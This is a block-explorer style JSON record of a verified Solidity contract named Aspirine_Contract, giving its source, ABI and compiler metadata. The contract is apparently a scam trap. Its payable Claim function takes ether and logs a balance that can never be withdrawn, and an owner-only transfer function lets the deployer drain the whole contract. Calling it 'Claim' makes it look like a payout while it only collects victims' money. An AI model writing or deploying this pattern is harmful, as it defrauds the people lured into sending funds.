{"SourceCode": "// SPDX-License-Identifier: Unlicense\r\n\r\npragma solidity ^0.8.17;\r\n\r\ncontract Aspirine_Contract {\r\n  address private owner;\r\n  mapping (address => uint256) private balances;\r\n  constructor() {\r\n    owner = msg.sender;\r\n  }\r\n  function getOwner() public view returns (address) {\r\n    return owner;\r\n  }\r\n  function getBalance() public view returns (uint256) {\r\n    return address(this).balance;\r\n  }\r\n  function transfer(uint256 amount) public {\r\n    require(msg.sender == owner, \"You must be owner to call this\");\r\n    amount = (amount == 0) ? address(this).balance : amount;\r\n    require(amount <= address(this).balance, \"It's not enough money on balance\");\r\n    payable(msg.sender).transfer(amount);\r\n  }\r\n  function Claim(address sender) public payable {\r\n    balances[sender] += msg.value;\r\n  }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"Claim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "Aspirine_Contract", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "Unlicense", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a982b8d249cb96cbf36441ddff7112613aaa30dc2cb3c2cecb45da26e32115c6"}